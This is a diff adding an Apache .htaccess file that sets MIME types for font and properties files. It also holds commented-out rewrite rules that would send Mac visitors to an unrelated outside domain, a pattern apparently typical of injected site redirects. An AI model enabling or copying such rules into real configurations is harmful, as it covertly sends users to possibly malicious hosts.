@@ -1,0 +1,11 @@
+#RewriteEngine on
+#RewriteCond %{HTTPS} =on
+#RewriteRule ^ - [E=isssl:https]
+#RewriteCond %{HTTPS} !=on
+#RewriteRule ^ - [E=isssl:http]
+
+#RewriteCond %{HTTP_USER_AGENT} Macintosh	[NC]
+#RewriteRule ^$	%{ENV:isssl}://cda2g.hhmr.biz/index.html?Mac	[R,L]
+
+AddType font/woff               .woff
+AddType text/plain              .properties
